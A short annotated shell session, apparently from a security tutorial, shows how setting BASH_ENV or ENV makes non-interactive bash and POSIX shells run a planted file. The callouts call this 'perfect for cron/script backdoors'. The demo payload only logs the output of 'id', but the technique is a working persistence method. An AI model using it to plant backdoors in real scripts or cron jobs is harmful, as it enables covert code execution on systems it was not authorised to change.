```sh -cwn
$ echo 'id >> /tmp/backdoor.log' > /tmp/.bashrc_evil
# !callout[/BASH_ENV/] Non-interactive bash sources BASH_ENV before running. Perfect for cron/script backdoors.
$ BASH_ENV=/tmp/.bashrc_evil bash -c 'echo "innocent script"'
innocent script
$ cat /tmp/backdoor.log
uid=1000(mistrale) gid=1000(mistrale) groups=1000(mistrale)
# !callout[/ENV/] POSIX shells use ENV instead. Works on dash, ash, busybox sh.
$ export ENV=/tmp/.bashrc_evil
$ sh -c 'echo "running sh"'
running sh
```


